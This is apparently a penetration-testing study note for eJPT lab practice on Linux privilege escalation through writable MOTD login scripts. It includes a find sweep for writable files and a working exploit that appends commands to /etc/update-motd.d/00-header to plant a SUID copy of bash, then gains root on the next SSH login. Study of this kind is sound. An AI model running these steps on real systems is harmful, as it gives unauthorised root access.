---
type: technique
tags: [ejpt:host-net-pentest]
tools: []
cves: []
related: ["[[cron-job-abuse]]", "[[path-hijacking]]", "[[suid-enumeration]]"]
---

# Writable MOTD / login scripts

`/etc/update-motd.d/*` scripts run as **root** on every SSH authentication — before you ever land in a shell. Write one and you own the *next* login.

## Find it

```sh
find / -writable 2>/dev/null | grep -v /proc/
# /etc/update-motd.d/00-header
```

`find -perm -4000` looks for SUID binaries; this is the complementary sweep — **files you can write**. On a box where you already hold a shell, the writable-file hunt often beats the SUID hunt.

## Exploit

```sh
cat >> /etc/update-motd.d/00-header << 'EOF'
cp /bin/bash /tmp/bash
chmod 4755 /tmp/bash
EOF

# trigger it: authenticate again (any account you hold)
ssh user@TARGET
/tmp/bash -p
whoami          # root
```

## Why this class works

You need two things, and only one is rare:

1. **A privileged process executes the file** (root owns the update job).
2. **An event you can trigger** — SSH login, `su`, cron tick, a web request.

MOTD is attractive because *you* are the trigger: reconnect and you're root, no waiting for cron ([[cron-job-abuse]]). It is the same primitive as a writable startup/cron script — the distinguishing feature is that the trigger is **authentication**.

## Notes

- Append, don't overwrite: the file is a shell script the system still has to parse.
- Clean up after yourself — a broken MOTD script breaks *everyone's* login, including yours.
- Same idea, other locations: `/etc/profile.d/`, `~/.bashrc` of a privileged user, any systemd unit a timer runs as root.

## Seen in

[[rutas]] (writable `/etc/update-motd.d/00-header` → SUID `/tmp/bash` → `/tmp/bash -p` → root)
